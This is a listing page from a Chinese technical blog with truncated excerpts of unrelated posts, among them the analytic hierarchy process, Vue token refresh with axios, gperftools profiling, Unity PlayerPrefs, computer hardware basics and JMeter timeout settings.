			<a href="/posts/36f10b2d219c5ba54ad933292578caa8/" rel="bookmark">
			层次分析法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、模型介绍
二、模型总结
三、模型Matlab代码详解
1.Matlab基本的小常识
2. sum函数
3. Matlab中如何提取矩阵中指定位置的元素？
4. size函数
5. repmat函数
6. Matlab中矩阵的运算(加点和不加点)
7. Matlab中求特征值和特征向量
8. find函数的基本用法
9. 矩阵与常数的大小判断运算
10. 判断和循环语句
四、模型代码样例
花花基于正版渠道购买来的清风数学建模教程进行层次分析法的学习，做如下总结：
一、模型介绍 层次分析法（The Analytic Hierarchy Process即 AHP)是由美国运筹学家、匹兹堡大学教授T.L.Saaty于20世纪70年代创立的一种系统分析与决策的综合评价方法，是在充分研究了人类思维过程的基础上提出来的，它较合理地解决了定性问题定量化的处理过程。AHP的主要特点是通过建立递阶层次结构，把人类的判断转化到若干因素两两之间重要度的比较上，从而把难于量化的定性判断转化为可操作的重要度的比较上面。在许多情况下，决策者可以直接使用AHP进行决策，极大
地提高了决策的有效性、可靠性和可行性，但其本质是一种思维方式，它把复杂问题分解成多个组成因素，又将这些因素按支配关系分别形成递阶层次结构，通过两两比较的方法确定决策方案相对重要度的总排序。整个过程体现了人类决策思维的基本特征，即分解、判断、综合，克服了其他方法回避决策者主观判断的缺点。
层次分析法(The analytic hierarchy process, 简称AHP)是建模比赛中最基础的模型之一，其主要用于解决评价类问题（例如：选择哪种方案最好、哪位运动员或者员工表现的更优秀）。
解决评价类问题，我们首先要想到以下三个问题：
① 我们评价的目标是什么？
② 我们为了达到这个目标有哪几种可选的方案？
③ 评价的准则或者说指标是什么？（我们根据什么东西来评价好坏）
一般而言，前两个问题的答案是显而易见的，第三个问题的答案需要我们根据题目中的背景材料、常识以及网上搜集到的参考资料进行结合，从中筛选出最合适的指标。
优先选择知网（或者万方、百度学术、谷歌学术等平台）搜索相关的文献。
为什么优先在别人发表的论文中寻找指标呢？
因为：显得专业。
另外，别人研究使用的方法你也可以进行合理借鉴
假如你没找到相关的文献怎么办？
和小组成员来场头脑风暴 + 在平台上搜索别人或者专家的看法
强烈推荐一个很厉害的网站——虫部落‐快搜 ： https://search.chongbuluo.com/
还可以去以下地方搜索：谷歌、百度、微信搜索、知乎搜索……
举例子：
现在小明纠结去苏杭、去北戴河还是去桂林旅游，我们要为他分析出最佳目的地，评价的准则或者说指标是：景色、花费、居住、饮食、交通。
关键是填好这张权重表格。
注意：在确定影响某因素的诸因子在该因素中所占的比重时，遇到的主要困难是这些比重常常不易定量化。此外，当影响某因素的因子较多时，直接考虑各因子对该因素有多大程度的影响时，常常会因考虑不周全、顾此失彼而使决策者提出与他实际认为的重要性程度不相一致的数据，甚至有可能提出一组隐含矛盾的数据。
——选自司守奎[kuí]老师的《数学建模算法与应用》
那么如何考虑它们的权重呢？我们决定用分而治之的方法。
问题：
一次性考虑这五个指标之间的关系，往往考虑不周。
解决方法：
两个两个指标进行比较，最终根据两两比较的结果来推算出权重
如果用下表表示重要程度，请两两比较上述这五个指标对于选择最终的旅游景点的重要性。
（注：这里的重要性有时候解释为满意度更方便理解）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36f10b2d219c5ba54ad933292578caa8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afa266ef4814cf5af487f0257a86ff1b/" rel="bookmark">
			unity-Embedded Browser
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1，将压缩包解压，将压缩包里面的文件放在与Assets同级目录下
2.SimpleDemo输入想到的网址，打包出来将Plugin下的X86文件下的Dill拖到上一级目录
3，显示网页不能输入中文，修改PointerUIGUI.cs里面的Onseltect方法为On
4，一些问题的解答
https://www.cnblogs.com/gentlesunshine/p/13923179.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7072ed8d7722cb52fc018cfdafbb0072/" rel="bookmark">
			VUE中拦截请求并无感知刷新token
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		应用场景
前端登录后，后端返回token和token失效时间，当达到特定条件（本文以距离token过期两小时为例），前端需要主动请求token刷新接口去获取一个新的token，做到用户无感知地去刷新token。
思路
拦截请求判断是否达到需要刷新token的条件，符合条件则刷新token并将请求存入一个重试队列中，当token刷新后，执行重试队列中的函数，达到刷新token的效果，需要注意的是，当多个请求几乎同时进来时，为了避免多次执行token刷新，需要定义一个变量（本文变量名为isRefreshing ）进行标记。
import axios from "axios"; import store from "@/store"; import md5 from "js-md5"; import { setToken, getToken, setUid, setExpireTime, getExpireTime } from "@/utils/auth"; // 创建axios实例 const service = axios.create({ // axios中请求配置有baseURL选项，表示请求URL公共部分 baseURL: window.location.protocol + process.env.VUE_APP_BASE_API, // 超时 timeout: 10000 }); // 是否正在刷新的标记 let isRefreshing = false; // 重试队列，每一项将是一个待执行的函数形式 let requests = []; // 判断是否距离过期2个小时 function isRefreshTokenExpired() { const expire_time = getExpireTime(); // 到期时间 const new_time = new Date().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7072ed8d7722cb52fc018cfdafbb0072/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1250bb12ef84721caf06ca2cb5d91bc7/" rel="bookmark">
			Ubuntu 使用perfTools进行软件的性能分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu 使用perfTools进行软件的性能分析
1.下载 http://download.savannah.gnu.org/releases/libunwind/
https://sourceforge.net/projects/gperftools.mirror/
sudo apt-get install graphviz
在/usr/local/下解压
sudo tar -zxvf libunwind-1.6.0-rc2.tar.gz
sudo tar -zxvf cp /home/hlx/Downloads/gperftools-2.9.1.tar.gz
cd 进入解压后的目录
安装库
./configure
sudo make
sudo make install
pprof 所在目录加入环境变量
新建qt工程，链接库
LIBS +=-lprofiler
LIBS +=-lunwind
main.cpp如下
查看目录下生成的的.prof文件
pprof ./untitled a.prof –web
#include &lt;gperftools/profiler.h&gt; #include &lt;stdlib.h&gt; void f() { int i; for (i=0; i&lt;1024*1024; ++i) { char *p = (char*)malloc(1024*1024*120); free(p); } } void fun1() { f(); } void fun2() { f(); } int main() { ProfilerStart("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1250bb12ef84721caf06ca2cb5d91bc7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1bec5879a5da641fb388046719b3c83e/" rel="bookmark">
			2021-11-05
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python中关于list用法汇总（多层列表） 1 、增加
import numpy as np arr = [[[0, 0, 0, 0, 1],[1, 1, 0, 1, 0]], [[1, 0, 1, 1, 0],[1, 0, 0, 1, 0]], [[1, 0, 0, 0, 1],[1, 1, 0, 1, 0]]] a = [[1, 1, 0, 0 ,1],[1,0, 0, 0, 0]] arr.append(a) #在末尾添加// extend()增加一个列表 print(arr) arr.insert(1, a)#在指定位置添加 print(arr) 结果： 在末尾添加[[[0, 0, 0, 0, 1], [1, 1, 0, 1, 0]], [[1, 0, 1, 1, 0], [1, 0, 0, 1, 0]], [[1, 0, 0, 0, 1], [1, 1, 0, 1, 0]], [[1, 1, 0, 0, 1], [1, 0, 0, 0, 0]]] 在指定位置添加[[[0, 0, 0, 0, 1], [1, 1, 0, 1, 0]], [[1, 1, 0, 0, 1], [1, 0, 0, 0, 0]], [[1, 0, 1, 1, 0], [1, 0, 0, 1, 0]], [[1, 0, 0, 0, 1], [1, 1, 0, 1, 0]]] 补充：extend（）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1bec5879a5da641fb388046719b3c83e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ee82507b57f17dbd415beddc04804af/" rel="bookmark">
			74-内存和外存的知识点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一：磁盘、硬盘和软盘 我们用电脑处理的信息都是保存在磁盘里的。 计算机的存储器有两类，一类是内部存储器(内存)，一断电就会把记住的东西忘光，一类是外部存储器(外存)，断了电也能记住 内存：存储信息速度快，断电后存储信息全部丢失。 外存：存储信息较慢，断电后存储信息不丢失 磁盘又分为两类，一类是硬盘，一类是软盘。 硬盘的容量比较大，也就是说它能记录的信息比较多，而且一般都装在机箱里面。软盘的容量就相对比较小了，一般放在机箱外面 计算机上有个特殊的地方叫做软盘驱动器，要用软盘的时候就把它放进这个地方，不用的时候可以很方便地拿出来带走。打个比方说，计算机像一个工厂，硬盘就是仓库，可以放很多东西，但是仓库是不能随便搬走的；软盘呢，就是卡车，装的东西虽然不多，但是搬运起来很方便 硬盘在机箱里面负责储存数据，而软盘用来搬运数据，硬盘的容量大，软盘的容量小，这就是它们的区别，另外硬盘的存取速度比软盘快得多。 存取速度，就是我们向磁盘储存数据和从磁盘上得到数据的快慢，这个速度越快，我们等待的时间就越少 硬盘是外部存储器，速度再快也比不上内存，否则计算机就用不着内存了。 硬盘存取速度快于软盘，而内存存取信息的速度又远远的快于硬盘。 一般说来，我们保存文件都是保存在硬盘上，只有在特殊需要的时候才会存到软盘上。而硬盘有很多种大小不同的型号，一般说来，硬盘的容量大约是软盘的几百到几万倍。 因为软盘的容量太小，所以用得越来越少了，近几年用得比较多的是光盘。平时我们用的音乐CD、VCD影碟都是光盘，电脑上用的软件光盘和它们外表看起来是一样的，而且CD和VCD都可以在电脑上使用 现在一般的硬盘容量在3GB到20多GB之间，软盘的容量为1.44MB多，光盘的最大容量大约是650MB，（DVD盘片单面4.7GB）。 MB和GB是什么意思呢？这是电脑里对信息的一种计量单位，1GB大约等于1000MB 那光盘的容量是比软盘大多了。那人们为什么还要使用软盘呢？光盘是有很多好处，但是它有一个最大的缺点，一般的光盘都是只能读不能写的。存储在磁盘或光盘上的信息，计算机把它取出来就叫读，我们保存自己的文件或者要修改盘上的信息，这种操作就叫做写。 取出磁盘中的信息叫做“读”；向磁盘中放入数据称为“写”。 其实当我们听录音带时，是在读出磁带上的信息，而用磁带录音乐的时候，就是在往磁带里写入信息，磁盘和磁带的存储原理差不多，所以磁盘上的信息也可以很方便地改写。 而光盘的存储原理比较特殊，里面存储的信息不能被轻易地改变。也就是说我们常见的光盘生产出来的时候是什么样，就一直是那样了 有一种特殊的光盘CD-R是可以写的，但需要使用“光盘刻录机”才能把文章写到CD-R光盘上。 我们所说的内部存储器就是内存，而外部存储器都是可以电脑中拆卸下来的。常见的外部存储器有硬盘、光盘、软盘。 在外部存储器中，只有硬盘是装在机箱里面的，而且是最常用的，我们平时使用电脑主要是与硬盘上的各种信息打交道。 我们可以运行的各种程序都在硬盘上，比如记事本，还有用记事本写的文章等等。它们都是以文件的形式保存在硬盘上的。￼ 二：固态硬盘和机械硬盘 固态硬盘是用固态电子存储芯片阵列制成的硬盘，也就是整个盘上所有东西都焊死在电路板上，是完全固定的。市面上的固态硬盘采用的是MLC或TLC的闪存颗粒。 MLC和TLC是两种不同存储单元的分类，MLC耐用性强、速度较快，不过价格也比较高，TLC耐用性与速度一般，不过价格便宜，性价比高。一般使用TLC就足够了，对于经常设计和视频剪辑的朋友，采用MLC颗粒的固态硬盘更好些 机械硬盘即主要由：盘片，磁头，盘片转轴及控制电机，磁头控制器，数据转换器，接口，缓存等几个部分组成。 机械硬盘中所有的盘片都装在一个旋转轴上，每张盘片之间是平行的，在每个盘片的存储面上有一个磁头，磁头与盘片之间的距离比头发丝的直径还小，所有的磁头联在一个磁头控制器上，由磁头控制器负责各个磁头的运动。 机械硬盘的工作原理是电磁存储，凭借磁头臂和磁盘转动写入或读取信息。机械硬盘理论上有无限次的写入次数，也因为每个数据都有固定的存储位置，误删数据后比较容易恢复。 固态硬盘与机械硬盘有什么区别：①价格不一样②读写速度不同③防摔抗震性 固态硬盘价格要比机械硬盘贵得多，目前市场价格普通的固体硬盘1GB≈1元，还是非常实惠的。 大部分移动机械硬盘读写速度在150MB/s以下，适合作为扩容盘存储文件使用；移动固态硬盘读写速度可达500MB/s以上，更适合运行程序、游戏等重度使用场景。 机械硬盘不要剧烈震动或摇晃。由于磁头运行时离盘片非常近，剧烈震动可能会使磁头摩擦磁片或将磁头打弯，使硬盘损坏。而固态硬盘是使用闪存颗粒多个组合而成，所以固态硬盘内部不存在任何机械部件，这样即使在高速移动甚至伴随翻转倾斜的情况下也不会影响到正常使用，所以在发生摔震的情况，SSD固态硬盘丢失数据的概率也要比机械硬盘小。 使用移动硬盘时需要注意些什么问题： ①避免摔和强烈震动移动硬盘，防止物理损坏硬盘 ②不要随便移动正在使用的移动硬盘；正在使用的移动硬盘正在高速转动，移动容易导致数据损坏。 ③养成使用完移动硬盘，选择安全弹出的习惯，避免直接拔出。 ④如果连续使用移动硬盘，中间最好停顿10秒钟左右再重新使用。 三：中央处理器（CPU） 中央处理器（CPU），是电子计算机的主要设备之一，电脑中的核心配件。其功能主要是解释计算机指令以及处理计算机软件中的数据。CPU是计算机中负责读取指令，对指令译码并执行指令的核心部件。中央处理器主要包括两个部分，即控制器、运算器，其中还包括高速缓冲存储器及实现它们之间联系的数据、控制的总线。电子计算机三大核心部件就是CPU、内部存储器、输入/输出设备。中央处理器的功效主要为处理指令、执行操作、控制时间、处理数据。 在计算机体系结构中，CPU 是对计算机的所有硬件资源（如存储器、输入输出单元） 进行控制调配、执行通用运算的核心硬件单元。CPU 是计算机的运算和控制核心。计算机系统中所有软件层的操作，最终都将通过指令集映射为CPU的操作。 对于CPU而言，影响其性能的指标主要有主频、 CPU的位数、CPU的缓存指令集、CPU核心数和IPC（每周期指令数）。所谓CPU的主频，指的就是时钟频率，它直接的决定了CPU的性能，可以通过超频来提高CPU主频来获得更高性能。而CPU的位数指的就是处理器能够一次性计算的浮点数的位数，通常情况下，CPU的位数越高，CPU 进行运算时候的速度就会变得越快。21世纪20年代后个人电脑使用的CPU一般均为64位，这是因为64位处理器可以处理范围更大的数据并原生支持更高的内存寻址容量，提高了人们的工作效率。而CPU的缓存指令集是存储在CPU内部的，主要指的是能够对CPU的运算进行指导以及优化的硬程序。一般来讲，CPU 的缓存可以分为一级缓存、二级缓存和三级缓存，缓存性能直接影响CPU处理性能。部分特殊职能的CPU可能会配备四级缓存。 通常来讲，CPU的结构可以大致分为运算逻辑部件、寄存器部件和控制部件等。所谓运算逻辑部件，主要能够进行相关的逻辑运算，如：可以执行移位操作以及逻辑操作，除此之外还可以执行定点或浮点算术运算操作以及地址运算和转换等命令，是一种多功能的运算单元。而寄存器部件则是用来暂存指令、数据和地址的。控制部件则是主要用来对指令进行分析并且能够发出相应的控制信号。而计算机的内存又可以分为随机存取存储器（RAM）和只读储存器(ROM)。两者的区别在于，随机存取存储器能够与CPU直接的进行数据的交换，也可以将其称为主存。对于RAM可以随时的进行读写，而且这个过程的速度很快，因此由于主存所具有的这个优点也往往将其作为操作系统或其他正在运行中的程序的临时数据存储媒介；而只读存储器ROM是一种只能读出事先所存数据的存储器，使用者对于其内部存储的资料没有改变的权限也无法对其进行删除，并且在电源关闭以后资料并不会消失。这种内存也得到了广泛的应用，在那些资料不需要经常变更的电子或电脑系统中得到了很好地应用。 对于中央处理器来说，可将其看作一个规模较大的集成电路，其主要任务是加工和处理各种数据。传统计算机的储存容量相对较小，其对大规模数据的处理过程中具有一定难度，且处理效果相对较低。随着我国信息技术水平的迅速发展，随之出现了高配置的处理器计算机，将高配置处理器作为控制中心，对提高计算机CPU的结构功能发挥重要作用。中央处理器中的核心部分就是控制器、运算器，其对提高计算机的整体功能起着重要作用，能够实现寄存控制、逻辑运算、信号收发等多项功能的扩散，为提升计算机的性能奠定良好基础。 集成电路在计算机内起到了调控信号的作用，根据用户操作指令执行不同的指令任务。中央处理器是一块超大规模的集成电路。它由运算器、控制器、寄存器等组成，如下图，关键操作在于对各类数据的加工和处理。 传统计算机存储容量较小，面对大规模数据集的操作效率偏低。新一代计算机采用高配置处理器作为控制中心，CPU在结构功能方面有了很大的提升空间。中央处理器以运算器、控制器为主要装置，逐渐扩散为逻辑运算、寄存控制、程序编码、信号收发等多项功能。这些都加快了CPU调控性能的优化升级。 CPU总线是在计算机系统中最快的总线，同时也是芯片组与主板的核心。人们通常把和CPU直接相连的局部总线叫做CPU总线或者称之为内部总线，将那些和各种通用的扩展槽相接的局部总线叫做系统总线或者是外部总线。在内部结构比较单一的CPU中，往往只设置一组数据传送的总线即CPU内部总线，用来将CPU内部的寄存器和算数逻辑运算部件等连接起来，因此也可以将这一类的总线称之为ALU总线。而部件内的总线，通过使用一组总线将各个芯片连接到一起，因此可以将其称为部件内总线，一般会包含地址线以及数据线这两组线路。系统总线指的是将系统内部的各个组成部分连接在一起的线路，是将系统的整体连接到一起的基础；而系统外的总线，是将计算机和其他的设备连接到一起的基础线路。 运算器是指计算机中进行各种算术和逻辑运算操作的部件， 其中算术逻辑单元是中央处理核心的部分。 （1）算术逻辑单元（ALU）。算术逻辑单元是指能实现多组 算术运算与逻辑运算的组合逻辑电路，其是中央处理中的重要组成部分。算术逻辑单元的运算主要是进行二位元算术运算，如加法、减法、乘法。在运算过程中，算术逻辑单元主要是以计算机指令集中执行算术与逻辑操作，通常来说，ALU能够发挥直接读入读出的作用，具体体现在处理器控制器、内存及输入输出设备等方面，输入输出是建立在总线的基础上实施。输入指令包含一 个指令字，其中包括操作码、格式码等。 （2）中间寄存器（IR）。其长度为 128 位，其通过操作数来决定实际长度。IR 在“进栈并取数”指令中发挥重要作用，在执行该指令过程中，将ACC的内容发送于IR，之后将操作数取到ACC，后将IR内容进栈。[2] （3）运算累加器（ACC）。当前的寄存器一般都是单累加器，其长度为128位。对于ACC来说，可以将它看成可变长的累加器。在叙述指令过程中，ACC长度的表示一般都是将ACS的值作为依据，而ACS长度与 ACC 长度有着直接联系，ACS长度的加倍或减半也可以看作ACC长度加倍或减半。 （4）描述字寄存器（DR）。其主要应用于存放与修改描述字中。DR的长度为64位，为了简化数据结构处理，使用描述字发挥重要作用。 （5）B寄存器。其在指令的修改中发挥重要作用，B 寄存器长度为32位，在修改地址过程中能保存地址修改量，主存地址只能用描述字进行修改。指向数组中的第一个元素就是描述字， 因此，访问数组中的其它元素应当需要用修改量。对于数组成来说，其是由大小一样的数据或者大小相同的元素组成的，且连续存储，常见的访问方式为向量描述字，因为向量描述字中的地址为字节地址，所以，在进行换算过程中，首先应当进行基本地址 的相加。对于换算工作来说，主要是由硬件自动实现，在这个过程中尤其要注意对齐，以免越出数组界限。 控制器是指按照预定顺序改变主电路或控制电路的接线和 改变电路中电阻值来控制电动机的启动、调速、制动与反向的主令装置。控制器由程序状态寄存器PSR，系统状态寄存器SSR， 程序计数器PC，指令寄存器等组成，其作为“决策机构”，主要任务就是发布命令，发挥着整个计算机系统操作的协调与指挥作用。 控制的分类主要包括两种，分别为组合逻辑控制器、微程序控制器，两个部分都有各自的优点与不足。其中组合逻辑控制器结构相对较复杂，但优点是速度较快；微程序控制器设计的结构简单，但在修改一条机器指令功能中，需对微程序的全部重编。 四：I/O设备 io设备指的是输入输出设备。 输入/输出（Input /Output ,简称I/O），指的是一切操作、程序或设备与计算机之间发生的数据传输过程。 输入输出设备是数据处理系统的关键外部设备之一，可以和计算机本体进行交互使用。如：键盘、写字板、麦克风、音响、显示器等。因此输入输出设备起了人与机器之间进行联系的作用。 输入设备是向计算机输入数据和信息的设备，是计算机与用户或其他设备通信的桥梁，是用户和计算机系统之间进行信息交换的主要装置之一。输入设备的任务是把数据、指令及某些标志信息等输送到计算机中去。键盘、鼠标、摄像头、扫描仪、光笔、手写输入板、游戏杆、语音输入装置等都属于输入设备（Input Device ），是人或外部与计算机进行交互的一种装置，用于把原始数据和处理这些数据的程序输入到计算机中。 计算机能够接收各种各样的数据，既可以是数值型的数据，也可以是各种非数值型的数据，如图形、图像、声音等都可以通过不同类型的输入设备输入到计算机中，进行存储、处理和输出。计算机的输入设备按功能可分为下列几类： ①字符输入设备：键盘； ②光学阅读设备：光学标记阅读机、光学字符阅读机； ③图形输入设备：鼠标器、操纵杆、光笔； ④图像输入设备：数码像机、扫描仪、传真机； ⑤模拟输入设备：语言模数转换识别系统。 输出设备（Output Device）是把计算或处理的结果或中间结果以人能识别的各种形式,如数字、符号、字母等表示出来,因此输入输出设备起了人与机器之间进行联系的作用。常见的有显示器、打印机、绘图仪、影像输出系统、语音输出系统、磁记录设备等。 显示器是计算机必不可少的一种图文输出设备，它的作用是将数字信号转换为光信号，使文字与图形在屏幕上显示出来；打印机也是PC机上的一种主要输出设备，它把程序、数据、字符图形打印在纸上。 控制台打字机、光笔、显示器等既可作输入设备、也可作输出设备。 输入输出设备（I/O）起着人和计算机、设备和计算机、计算机和计算机的联系作用。 五：内存(内部存储器或主存储器) 内存(Memory)是计算机的重要部件之一，也称内存储器和主存储器，它用于暂时存放CPU中的运算数据，与硬盘等外部存储器交换的数据。它是外存与CPU进行沟通的桥梁，计算机中所有程序的运行都在内存中进行，内存性能的强弱影响计算机整体发挥的水平。只要计算机开始运行，操作系统就会把需要运算的数据从内存调到CPU中进行运算，当运算完成，CPU将结果传送出来。内存的运行也决定计算机整体运行快慢的程度。 内存条由内存芯片、电路板、金手指等部分组成。在计算机的组成结构中有一个很重要的部分是存储器。它是用来存储程序和数据的部件。 对于计算机来说，有了存储器，才有记忆功能，才能保证正常工作。 存储器的种类很多。按其用途可分为主存储器和辅助存储器，主存储器又称内存储器（简称内存，港台称之为记忆体） 内存又称主存。它是CPU能直接寻址的存储空间，由半导体器件制成。特点是存取速率快。 内存是电脑中的主要部件，它是相对于外存而言的。 我们平常使用的程序，如：Windows操作系统、打字软件、游戏软件等。一般安装在硬盘等外存上，但仅此是不能使用其功能，必须把它们调入内存中运行，才能真正使用其功能。 我们平时输入一段文字或玩一个游戏，其实是在内存中进行。好比在一个书房，存放书籍的书架和书柜相当于电脑的外存，我们工作的办公桌相当于内存。 通常，我们把要永久保存、大量数据存储在外存上，把一些临时或少量的数据和程序放在内存上。当然，内存的好坏会直接影响电脑的运行速度。 内存是暂时存储程序以及数据的地方。当我们使用WPS处理文稿时，当你在键盘上敲入字符时，它被存入内存中。当你选择存盘时，内存中的数据才会被存入硬（磁）盘。 六：size_t和ssize_t ①size_t、ssize_t的类型 size_t是一些C/C++标准在stddef.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ee82507b57f17dbd415beddc04804af/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47dee3ede22b8cde91c53c58a0d3ead7/" rel="bookmark">
			纯java代码实现去水印功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		public class WatermarkUtils { private static List&lt;File&gt; fileList = new ArrayList&lt;&gt;(); public static void main(String[] args) { //convertAllImages("F:\\before.png", "F:\\after.png"); fileList.add(new File("F:\\before.png")); convertAllImages(fileList); } /** * 去除文件列表里图片的水印并替换 * * @Param fileList 文件列表 */ public static void convertAllImages(List&lt;File&gt; fileList) { try { for (File file : fileList) { if (!file.getName().endsWith("png") &amp;&amp; !file.getName().endsWith("jpg")) { continue; } BufferedImage bi = ImageIO.read(file); //用ImageIO流读取像素块 if (bi != null) { removeWatermark(bi); String formatName = file.getName().substring(file.getName().lastIndexOf(".") + 1);//生成的图片格式 ImageIO.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47dee3ede22b8cde91c53c58a0d3ead7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c04786f2f0ce8a901f0dfc7120386dd/" rel="bookmark">
			【ArcGIS】Failed to create the site. One or more server machines could not be stopped
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个是在server 创建站点时的一个报错，原server卸载重装的，最终解决办法是，删了这个目录下的所有数据，重启了下server 服务器，然后创建成功。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9be6b9ce0485bb87881a2d737b5dc3e7/" rel="bookmark">
			Unity数据持久化之PlayerPrefs，详细
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本博客主要记录PlayerPrefs的使用,比较长
1、什么是数据持久化 数据持久化就是将内存中的数据模型转化为存储模型，以及将存储模型转化为内存中数据模型的通称
简述：将游戏中的数据存储到硬盘，然后可以下次进游戏的时候读取硬盘中的数据到内存。
2、什么是PlayerPrefs 是Unity提供的可以用于存储玩家数据的公共类
3、存储的相关API PlayerPrefs的数据存储 类似于键值对存储 一个键对应一个值提供了存储3种数据的方法 int float string键: string类型值：int float string 对应3种API 示例： PlayerPrefs.SetInt("myAge", 18); PlayerPrefs.SetFloat("myHeight", 177.5f); PlayerPrefs.SetString("myName", "Adeng"); 只要调用该方法 就会马上存储到硬盘中 PlayerPrefs.Save(); 4、注意点 直接调用Set相关方法 只会把数据存到内存里当游戏结束时 Unity会自动把数据存到硬盘中如果游戏不是正常结束的 而是崩溃 数据是不会存到硬盘中的 PlayerPrefs是有局限性的 它只能存3种类型的数据 如果你想要存储别的类型的数据 只能降低精度 或者上升精度来进行存储 例如存储bool需要这样 bool sex = true; PlayerPrefs.SetInt("sex", sex ? 1 : 0); 如果不同类型用同一键名进行存储 会进行覆盖 5、读取的相关API 运行时 只要你Set了对应键值对，即使你没有马上存储Save在本地，也能够读取出信息PlayerPrefs.GetInt(string , value) 第二个参数就是默认值，若不存在，那么就直接取第二个参数作为返回值GetInt、GetFloat、GetString同理PlayerPrefs.HasKey(string) 判断string为key的值是否存在PlayerPrefs.DeleteKey(“myAge”); 删除某个键值对PlayerPrefs.DeleteAll();删除所有的键值对 //int int age = PlayerPrefs.GetInt("myAge"); print(age); //前提是 如果找不到myAge对应的值 就会返回函数的第二个参数 默认值 age = PlayerPrefs.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9be6b9ce0485bb87881a2d737b5dc3e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e9ce48a812613e24c86a081f65e1ef0/" rel="bookmark">
			JAVA 基础 (第五天)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1 JAVA语法基础
1.1 标识符
1.2 关键字
1.3.1 注释
1.3.2 练习:
1.4 变量
1.5 常量
2 数据类型
2.1 基本类型介绍(八种)
2.2 练习: 输入个人信息
2.3 练习：查看基本类型的最大值与最小值
2.4 练习：求圆形的面积
2.5 练习：变量交换
2.6 引用类型
3 基本类型的字面值（5条）
3.1 整数类型的字面值类型是int类型
3.2 浮点数类型的字面值类型是double类型
3.3 byte，short，char三种比int小的整数可以用范围内的值直接赋值
3.4 字面值后缀L D F
3.5 进制前缀
4 基本类型的类型转换
4.1 小到大(隐式转换)
4.2 大到小(显式转换)
4.3 口诀:
小到大，直接转 大到小，强制转 浮变整,小数没
低 ------------------------------------&gt; 高
byte,short,char→ int→ long→float→double
5 运算规则（5条）
5.1 计算结果的数据类型，与最大数据类型一致
5.2 byte,short,char三种比int小的整数，运算时会先自动转换成int
5.3 整数运算溢出
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e9ce48a812613e24c86a081f65e1ef0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27eb1d48b93fd2a0744461b8cde90a12/" rel="bookmark">
			jmeter设置请求的超时时间和服务超时时间如何合理设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		超时设置。在 HTTP 协议中，规定了几种超时时间，分别是连接超时、网关超时、响应超时等。
http默认的超时时间时120s，在工具中，我们可以定义连接和响应的超时时间。但通常情况下，我们不用做这样的规定，只要跟着服务端的超时走就行了。但在有些场景中，不止是应用服务器有超时时间，网络也会有延迟，这些会影响我们的响应时间
超时的设置是为了保证数据可以正常地发送到客户端。做性能分析的时候，经常有人听到“超时”这个词就觉得是系统慢导致的，其实有时也是因为配置。
通常，我们会对系统的超时做梳理，每个服务应该是什么样的超时设置，我们要有全局的考量。
通常，我们会对系统的超时做梳理，每个服务应该是什么样的超时设置，我们要有全局的考量。比如说：超时应该是逐渐放大的（不管你后面用的是什么协议，超时都应该是这个样子）。而我们现在的系统，经常是所有的服务超时都设置得一样大，或者都是跟着协议的默认超时来。在压力小的时候，还没有什么问题，但是在压力大的时候，就会发现系统因为超时设置不合理而导致业务错误。
如果倒过来的话，你可以想像，用户都返回超时报错了，后端还在处理着呢，那就更有问题了。
而我们性能测试人员，都是在压力工具中看到的超时错误。如果后端的系统链路比较长，就需要一层层地往后端去查找，看具体是哪个服务有问题。所以在架构层级来分析超时是非常有必要的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a232abeb205500628becde2d768829f3/" rel="bookmark">
			GPU加速深度学习训练
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CPU、GPU、CUDA，CuDNN 简介 CPU、GPU、CUDA，CuDNN 简介
cuda CUDA(Compute Unified Device Architecture)，是英伟达公司推出的一种基于新的并行编程模型和指令集架构的通用计算架构，它能利用英伟达GPU的并行计算引擎，比CPU更高效的解决许多复杂计算任务。
